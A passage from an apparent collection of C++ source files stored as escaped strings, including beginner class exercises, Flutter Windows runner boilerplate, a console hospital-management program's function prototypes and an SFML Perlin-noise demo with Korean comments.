 {\n        cout << \"TV Info:\\n\";\n        cout << \"\\tBrand: \" << brand << \"\\n\";\n        cout << \"\\tModel: \" << model << \"\\n\";\n        cout << \"\\tDiagonal: \" << diagonal << \" inches\" << \"\\n\";\n        cout << \"\\tColor: \" << color << \"\\n\";\n    }\n    void TV_On() \n    {\n        cout << \"The TV turns on...\\n\";\n    }\n\n    void TV_Off() \n    {\n        cout << \"The TV turns off\\n\";\n    }\n\n    void changeChannel(int channel) \n    {\n        cout << \"Changing channel to \" << channel << \"\\n\";\n    }\n\n};\n\nclass Automobile\n{\npublic: \n    string brand;\n    string model;\n    string equipment;\n    string engine_type;\n    double engine_volume = 0;\n    string fuel;\n    string transmision;\n    double power = 0;\n    int wheel_drive = 0;\n\n    void CarInfo()\n    {\n        cout << \"Car Information:\\n\";\n        cout << \"\\t\\tCar brand: \" << brand << \"\\n\";\n        cout << \"\\t\\tModel: \" << model << \"\\n\";\n        cout << \"\\t\\tCar equipment: \" << equipment << \"\\n\";\n        cout << \"\\t\\tEngine type: \" << engine_type << \"\\n\";\n        cout << \"\\t\\tEngine volume: \" << engine_volume << \" sm3\\n\";\n        cout << \"\\t\\tFuel: \" << fuel << \"\\n\";\n        cout << \"\\t\\tTransmision: \" << transmision << \"\\n\";\n        cout << \"\\t\\tEngine power: \" << power << \" hp\\n\";\n        cout << \"\\t\\tWheel drive: \" << wheel_drive << \" wheels\\n\";\n    }\n\n};\n\nclass Sosed\n{\npublic:\n    string name;\n    string shoes;\n    string tool;\n    bool sleeping = false;\n    string mental_condition;\n\n    void Never_sleep()\n    {\n        cout << \"A-HA-HA!!! NO, NO, NO\\n\";\n    }\n    void About_myself()\n    {\n        cout << \"My name is \" << name << \", i am a \" << mental_condition << \" And i have a \" << tool << \"\\n\";\n    }\n    void Work()\n    {\n        cout << \"I'll put my on now \" << shoes << \" and take my \" << tool << \"\\n\";\n        cout << \"I urgently need to do something. NOW!\\n\";\n    }\n};\n\nint main()\n{\n  //////////////////////////////////////////////////////////////////////////                  DOG                    ///////////////////////////////////////////////////////////////// \n    Dog dog;\n\n    dog.name = \"Benya\";\n    dog.favorite_food = \"meat\";\n    dog.bread = \"Pikines \";\n    dog.weight = 6;\n    dog.color = \"beige\";\n    \n    cout << dog.name",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\r\n#include<fstream>\r\n#include <string>\r\n#include <conio.h>\r\n#include <windows.h>\r\n#include <ctime>\r\n#include<cctype>\r\n#include<limits>\r\nusing namespace std;\r\n//functions prototype starts\r\nvoid topheading();\r\nvoid header();\r\nvoid delay(int milliseconds);\r\nvoid showLoadingAnimation();\r\nvoid gotoxy(int x, int y);\r\nvoid multaninterface();\r\nvoid islamabadinterface();\r\nvoid lahoreinterface();\r\nstring login();\r\nvoid thankyou();\r\nvoid clear();\r\nvoid hideCursor();\r\nstring adminmenu();\r\nint check_integer(string num);\r\nvoid prescription();\r\nvoid addpatient(int &addpatientindex, string patientname[], string patientage[], string patientcnic[], string patientbloodgroup[], string patienthistory[], string visitdatepatient[], string patientphonenumber[], string filenameaddpatient);\r\nvoid dischargepatient(string dischargepatientcnic, int addpatientindex, string patientcnic[], string patientname[], string patientage[], string patientbloodgroup[], string patienthistory[], string patientphonenumber[], string visitdatepatient[], string filenameaddpatient);\r\nvoid viewpatient(int &addpatientindex, string patientname[], string patientage[], string patientcnic[], string patientbloodgroup[], string patienthistory[], string visibledatepatient[], string patientphonenumber[]);\r\nvoid changingsalary(string doctorsalary, string managersalary, string filenamecahngingsalary);\r\nvoid profitloss(string patientcharges, int addpatientindex, string filenameprofitloss);\r\nvoid addbed(string bedadd, string filenameaddbed);\r\nvoid adddoctor(string doctorname[], string doctorspeciality[], int &adddoctorindex, string filenameadddoctor);\r\nvoid viewdoctor(string doctorname[], string doctorspeciality[],string hire[], int &adddoctorindex);\r\nvoid changeequipmentmanager(int &managercheck, string &equipmentmanagername, string &equipmentmanagergender, string &equipmentmanagercnic, string filenameaddequipmentmanager);\r\nvoid addequipmentmanager(string equipmentmanagername, string equipmentmanagergender, string equipmentmanagercnic, int &managercheck, string filenameaddequipmentmanager);\r\nvoid updatepatient(string updatepatientcnic, string patientcnic[], int &addpatientindex, string patientname[], string patientage[], string patientbloodgroup[], string patienthistory[], string visitdatepatient[], string patientphonenumber[], string filenameaddpatient);\r\nstring pateintmenu();\r\nvoid doctorschedule(string doctorname[], string doctorspeciality[],string hire[], int &adddoctorindex);\r\nvoid viewdoctorslist(string doctorname[], string doctorspeciality[],string hire[], int &adddoctorindex);\r\nvoid selectdoctor(string selectdoctorname, string selectdoctorspeciality, int &adddoctorindex, string doctorname[], string doctorspeciality[], string hire[]);\r\nvoid availablebeds(string bedadd, int &addpatientindex);\r\nvoid billinginvoice(string servicetype[], int &addbillingindex, string daysstayes[], string roomtype[]);\r\nvoid reviewhearth();\r\nvoid bilslip(string servicetype[], string daysstayes[], string roomtype[], int &addbillingindex);\r\nstring viewprescription();\r\nvoid patientreview(string review[], int &addpatientindex);\r\nstring pharmacymenu();\r\nvoid addmedicineform(string medicinename[], string medicinequantity[], string medicineexpirydate[], string medicineprice[], string medicinebatchnumber[], int &addmedicineindex, string filenameaddmedicine);\r\nvoid viewmedicineform(string buymedicinequantity, int &addmedicineindex, string medicinename[], string medicinequantity[], string medicineexpirydate[], string medicineprice[], string medicinebatchnumber[], string filenameaddmedicine);\r\nvoid updatemedicineform(string updatemedicinebatchnumber, string medicinebatchnumber[], int &addmedicineindex, string medicinename[], string medicinequantity[], string medicineexpirydate[], string medicineprice[], string filenameaddmedicine);\r\nstring doctormenu();\r\nvoid buymedicines(string buymedicinequantity, string purchasemedicines, int &addmedicineindex, string medicinename[], string medicinequantity[], string medicineexpirydate[], string medicineprice[], string medicinebatchnumber[], string filenamebuymedicines);\r\nbool charactermCheck(string characterCheck);\r\nvoid expiredmedicine(int addmedicineindex, string currentdate[], string medicineexpirydate[], string medicinename[]);\r\nbool recursionCheck(string check, string recursion[], int size);\r\nbool checkenter(string check);\r\nbool gendercheck(string check);\r\nbool digitscheck(string digits);\r\nbool checkshiftin(string check[]);\r\nvoid addmanager(string managername, string managercnic);\r\nvoid medicineindemand();\r\nint convertDatetodays(string date); \r\nbool isExpired(string currentDate, string expiryDate);\r\nvoid removemedicine(string updatemedicinebatchnumber, int &addmedicineindex, string medicinebatchnumber[], string medicinename[], string medicinequantity[], string medicineexpirydate[], string medicineprice[], string filenameaddmedicine);\r\nvoid addemploy(string employname[], int &addemployindex, string employcnic[], string employphonenumbe",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#define _USE_MATH_DEFINES\n#include <SFML/Graphics.hpp>\n#include <cmath>\n#include <vector>\n#include <algorithm>\n#include <random>\n#include <iostream>\n\nusing namespace std;\n\nclass Vector2 {\npublic:\n    float x, y;\n\n    Vector2(float _x, float _y) : x(_x), y(_y) {}\n\n    float dot(const Vector2& other) const {\n        return x * other.x + y * other.y;\n    }\n};\n\n// Fisher-Yates \uc54c\uace0\ub9ac\uc998.\nvoid Shuffle(std::vector<int>& arrayToShuffle) {\n    std::random_device rd;\n    std::mt19937 g(rd());\n\n    for (int e = arrayToShuffle.size() - 1; e > 0; e--) {\n        std::uniform_int_distribution<int> distribution(0, e - 1);\n        int index = distribution(g);\n\n        std::swap(arrayToShuffle[e], arrayToShuffle[index]);\n    }\n}\n\n// \ubbf8\ub9ac \ub9cc\ub4e0 \uc218\uc5f4\uc744 \uc0ac\uc6a9\ud55c\ub2e4. 0 - \nstd::vector<int> MakePermutation() {\n    std::vector<int> permutation;\n    for (int i = 0; i < 256; i++) {\n        permutation.push_back(i);\n    }\n\n    Shuffle(permutation);\n\n    for (int i = 0; i < 256; i++) {\n        permutation.push_back(permutation[i]);\n    }\n\n    return permutation;\n}\n\nconst std::vector<int> Permutation = MakePermutation();\n\nVector2 GetGradientVector(int v) {\n    int h = v & 3;\n    if (h == 0)\n        return Vector2(1.0f, 1.0f);\n    else if (h == 1)\n        return Vector2(-1.0f, 1.0f);\n    else if (h == 2)\n        return Vector2(-1.0f, -1.0f);\n    else\n        return Vector2(1.0f, -1.0f);\n}\n\nfloat Fade(float t) {\n    return ((6 * t - 15) * t + 10) * t * t * t;\n}\n\nfloat Lerp(float t, float a1, float a2) {\n    return a1 + t * (a2 - a1);\n}\n\nfloat Noise2D(float x, float y) {\n    // 1. \uac01 x, y \uc2e4\uc218\ub97c \uc785\ub825\uc73c\ub85c \ub450\uc5c8\uc744 \ub54c, \ud53d\uc140\ub4e4\uc740 \uc815\uc218 \uadf8\ub9ac\ub4dc\uc5d0 \uc874\uc7ac\ud569\ub2c8\ub2e4.\n\n    int X = static_cast<int>(std::floor(x)) & 255;\n    int Y = static_cast<int>(std::floor(y)) & 255;\n\n    // 1. \uc18c\uc218\ubd80\ub9cc \ub0a8\uae30\uac8c \ud569\ub2c8\ub2e4.\n    float xf = x - std::floor(x);\n    float yf = y - std::floor(y);\n\n    // 2. \ud574\ub2f9 \uc815\uc0ac\uac01\ud615 \uadf8\ub9ac\ub4dc \uac01 \uaf2d\uc9d3\uc810\uc5d0 \uadf8\ub798\ub514\uc5b8\ud2b8(\uae30\uc6b8\uae30) \ubca1\ud130\ub97c \ud560\ub2f9\ud569\ub2c8\ub2e4.\n    // 2-1. Ken Perlin \uc774 \uc81c\uc548\ud55c \uc21c\uc5f4\uc774 \uc874\uc7ac\ud569\ub2c8\ub2e4.\n    // 2-2. \uc21c\uc5f4\uc5d0\uc11c \uac12\uc744 \uac00\uc838\uc635\ub2c8\ub2e4. \uac01 \ubaa8\uc11c\ub9ac\ub4e4\uc5d0\uac8c \uc21c\uc5f4\uc758 \uac12\uc744 \ud560\ub2f9\ud569\ub2c8\ub2e4.\n    int valueTopRight = Permutation[Permutation[X + 1] + Y + 1];\n    int valueTopLeft = Permutation[Permutation[X] + Y + 1];\n    int valueBottomRight = Permutation[Permutation[X + 1] + Y];\n    int valueBottomLeft = Permutation[Permutation[X] + Y];\n\n    // 3. \uac01 \ubaa8\uc11c\ub9ac\uc810\uc5d0\uc11c \uc785\ub825 \uc810\uae4c\uc9c0\uc758 \uac70\ub9ac \ubca1\ud130\ub97c \uad6c\ud569\ub2c8\ub2e4.\n    Vector2 topRight(xf - 1.0f, yf - 1.0f);\n    Vector2 topLeft(xf, yf - 1.0f);\n    Vector2 bottomRight(xf - 1.0f, yf);\n    Vector2 bottomLeft(xf, yf);\n\n    // 4. \uac01 \ubaa8\uc11c\ub9ac \uc810\uc758 \uc624\ud504\uc14b \ubca1\ud130(\uc785\ub825 \uc810\uae4c\uc9c0\uc758 \uac70\ub9ac \ubca1\ud130) \uacfc \ubaa8\uc11c\ub9ac \uc810\uc758 \uae30\uc6b8\uae30\ub97c \ub0b4\uc801\ud569\ub2c8\ub2e4. \uadf8\ub798\ub514\uc5b8\ud2b8 \ubca1\ud130\uc758 \uc601\ud5a5\ub825\uc740 \uac70\ub9ac\uc5d0 \ub530\ub77c \ucee4\uc9d1\ub2c8\ub2e4.\n    float dotTopRight = topRight.dot(GetGradientVector(valueTopRight));\n    float dotTopLeft = topLeft.dot(GetGradientVector(valueTopLeft));\n    float dotBottomRight = bottomRight.dot(GetGradientVector(valueBottomRight));\n    float dotBottomLeft = bottomLeft.dot(GetGradientVector(valueBottomLeft));\n\n    // 5. \ubd80\ub4dc\ub7ec\uc6b4 \ubcf4\uac04(smooth interpolation)\uc744 \uc704\ud574 \uc0ac\uc6a9\ub429\ub2c8\ub2e4. \n    // \uc774 \ud568\uc218\ub294 \uc785\ub825 \uac12 t\ub97c 0\uc5d0\uc11c 1 \uc0ac\uc774\uc758 \uac12\uc73c\ub85c \ub9e4\ud551\ud558\uba70, \ub2e4\ud56d\uc2dd \uace1\uc120\uc744 \ub530\ub77c \ubcc0\ud654\ud569\ub2c8\ub2e4.\n    float u = Fade(xf);\n    float v = Fade(yf);\n\n    // 6. \ub0b4\uc801\ud55c \uac12\ub4e4\uc744 \ud63c\ud569\ud558\uc5ec \ub2e8\uc77c\uc758 \uac12\uc73c\ub85c \ub9cc\ub4ed\ub2c8\ub2e4. \n    float result = Lerp(v,\n        Lerp(u, dotBottomLeft, dotBottomRight), Lerp(u, dotTopLeft, dotTopRight));\n\n    return result;\n}\n\nfloat FractalBrownianMotion(float x, float y, int numOctaves) {\n    float result = 0.0f;\n    float amplitude = 1.0f;\n    float frequency = 0.005f;\n    float persistence = 0.5f;\n\n    for (int octave = 0; octave < numOctaves; octave++) {\n        float n = amplitude * Noise2D(x * frequency, y * frequency);\n        result += n;\n\n        amplitude *= persistence; \n        frequency *= 2.0f;\n    }\n\n    result = std::max(-1.0f, std::min(1.0f, result));\n\n    return result;\n}\n\nint main() {\n    const int windowWidth = 800;\n    const int windowHeight = 600;\n    const int numOctaves = 8;\n\n    sf::RenderWindow window(sf::VideoMode(windowWidth, windowHeight), \"Perlin Noise\");\n\n    sf::Image textureImage;\n    textureImage.create(windowWidth, windowHeight);\n\n    for (int y = 0; y < windowHeight; y++) {\n        for (int x = 0; x < windowWidth; x++) {\n            float persistence = 0.5f;\n            float frequency = 0.01f;\n            //float n = Noise2D(x * frequency, y * frequency);\n            //float value = n;\n            float value = FractalBrownianMotion(static_cast<float>(x), static_cast<float>(y), numOctaves);\n            value = (value + 1.0f) / 2.0f; // Normalize to [0, 1]\n\n            sf::Color color(static_cast<sf::Uint8>(255 * value), static_cast<sf::Uint8>(255 * value), static_cast<sf::Uint8>(255 * value));\n            textureImage.setPixel(x, y, color);\n        }\n    }\n\n    sf::Texture texture;\n    texture.loadFromImage(textureImage);\n    sf::Sprite sprite(texture);\n\n    while (window.isOpen()) {\n        sf::Event event;\n        while (window.pollEvent(event)) {\n            if (event.type == sf::Event::Closed)\n                window.close();\n        }\n\n        window.clear();\n        window.draw(sprite);\n        window.display();\n    }\n\n    return 0;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_25\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"theme_light_dark\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
